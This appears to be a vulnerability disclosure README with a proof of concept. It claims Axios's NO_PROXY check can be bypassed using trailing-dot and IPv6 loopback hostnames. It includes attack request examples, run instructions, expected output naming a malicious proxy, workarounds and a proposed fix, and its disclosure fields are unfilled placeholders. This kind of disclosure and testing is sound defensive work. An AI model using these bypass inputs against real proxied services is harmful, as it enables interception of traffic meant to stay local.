# Axios NO_PROXY Bypass Vulnerability - Proof of Concept

## Vulnerability Summary

**Affected Component:** Axios HTTP client library  
**Vulnerability Type:** Proxy bypass / SSRF  
**Severity:** Medium-High  

Axios does not correctly handle hostname normalization when checking NO_PROXY rules. Requests to loopback addresses like `localhost.` (with a trailing dot) or `[::1]` (IPv6 literal) skip NO_PROXY matching and go through the configured proxy.

## Technical Details

### Root Cause

According to **RFC 1034 §3.1** and **RFC 3986 §3.2.2**, a hostname can have a trailing dot to indicate it's a fully qualified domain name (FQDN). At the DNS level:
- `localhost.` is equivalent to `localhost`
- `127.0.0.1.` is equivalent to `127.0.0.1`

However, Axios performs **literal string comparison** when checking NO_PROXY entries instead of normalizing hostnames first.

### Vulnerability Patterns

1. **Trailing dots:** `localhost.`, `127.0.0.1.`
2. **IPv6 literals:** `[::1]`
3. **Case variations:** Combined with other normalization issues

### Example Attack Flow

```javascript
// Application configuration
process.env.NO_PROXY = 'localhost,127.0.0.1';
axios.defaults.proxy = { host: 'proxy.corp.com', port: 8080 };

// Normal request - bypasses proxy ✓
axios.get('http://localhost:8080/admin');

// Attack request - goes through proxy! ✗
axios.get('http://localhost.:8080/admin');
```

## Impact

1. **Proxy Bypass:** Requests to protected loopback addresses are incorrectly proxied
2. **SSRF Vector:** Attackers can reach internal services through the proxy
3. **Data Interception:** Sensitive data meant for localhost flows through external proxy
4. **Security Control Bypass:** NO_PROXY protection is circumvented

## Running the POC

### Prerequisites

```bash
npm install
```

### Basic Test (Connection Errors)

This will demonstrate that Axios handles the hostnames differently:

```bash
npm test
```

### Full Test (With Test Server)

This runs a local server to show actual request routing:

```bash
# Terminal 1 - Start test server
node test-server.js

# Terminal 2 - Run POC
node poc.js
```

## Expected Output

```
======================================================================
Axios NO_PROXY Bypass Vulnerability - Proof of Concept
======================================================================

NO_PROXY setting: localhost,127.0.0.1
Configured proxy: malicious-proxy.example.com:8888

Test 1: Request to http://localhost:8080/
Expected: Should bypass proxy (NO_PROXY contains "localhost")
✓ Request bypassed proxy - connection refused by localhost:8080

Test 2: Request to http://localhost.:8080/
Expected: Should bypass proxy (RFC 1034 §3.1 - equivalent to localhost)
Actual: Will go through proxy due to literal string comparison
✗ VULNERABILITY CONFIRMED: Request went through proxy!
   localhost. should be treated as localhost but was proxied.

Test 3: Request to http://[::1]:8080/
Expected: Should bypass proxy (::1 is IPv6 loopback)
Actual: Will go through proxy - not in NO_PROXY list
✗ VULNERABILITY CONFIRMED: Request went through proxy!
   ::1 is IPv6 loopback but was not recognized.

Test 4: Request to http://127.0.0.1.:8080/
Expected: Should bypass proxy (equivalent to 127.0.0.1)
Actual: Will go through proxy due to literal string comparison
✗ VULNERABILITY CONFIRMED: Request went through proxy!
   127.0.0.1. should be treated as 127.0.0.1 but was proxied.
```

## Mitigation

### Immediate Workarounds

1. **Explicit NO_PROXY entries** (Band-aid approach):
   ```bash
   export NO_PROXY="localhost,localhost.,127.0.0.1,127.0.0.1.,::1,[::1]"
   ```

2. **Input validation:**
   ```javascript
   function sanitizeUrl(url) {
     // Reject URLs with trailing dots or IPv6 literals
     if (url.includes('localhost.') || url.match(/\[::1\]/)) {
       throw new Error('Invalid URL format');
     }
     return url;
   }
   ```

3. **Normalize hostnames:**
   ```javascript
   const url = new URL(inputUrl);
   url.hostname = url.hostname.replace(/\.$/, ''); // Strip trailing dot
   ```

### Proper Fix (For Axios Maintainers)

Update the NO_PROXY matching logic to:

1. **Strip trailing dots** from hostnames before comparison
2. **Normalize IPv6 addresses** to canonical form
3. **Recognize loopback equivalents:**
   - `localhost`, `127.0.0.1`, `::1` should all be treated as loopback
4. **Perform case-insensitive comparison**

Example implementation:

```javascript
function normalizeHostname(hostname) {
  // Strip trailing dot
  hostname = hostname.replace(/\.$/, '');
  
  // Handle IPv6 literals
  hostname = hostname.replace(/^\[|\]$/g, '');
  
  // Normalize loopback addresses
  const loopbackVariants = ['localhost', '127.0.0.1', '::1'];
  if (loopbackVariants.includes(hostname.toLowerCase())) {
    return 'localhost'; // canonical form
  }
  
  return hostname.toLowerCase();
}

function shouldProxy(url, noProxy) {
  const urlHost = normalizeHostname(new URL(url).hostname);
  return !noProxy.split(',').some(entry => 
    normalizeHostname(entry.trim()) === urlHost
  );
}
```

## References

- **RFC 1034 §3.1:** Domain Names - Concepts and Facilities
- **RFC 3986 §3.2.2:** URI Generic Syntax - Host
- **OWASP SSRF:** https://owasp.org/www-community/attacks/Server_Side_Request_Forgery

## Disclosure Timeline

- **Discovery Date:** [Your date]
- **Vendor Notification:** [Pending/Date]
- **Public Disclosure:** [Pending/Date]
- **CVE ID:** [Pending assignment]

## Author

[Your name/handle]

## Disclaimer

This proof-of-concept is provided for educational and security research purposes only. Do not use this against systems you don't own or have explicit permission to test.
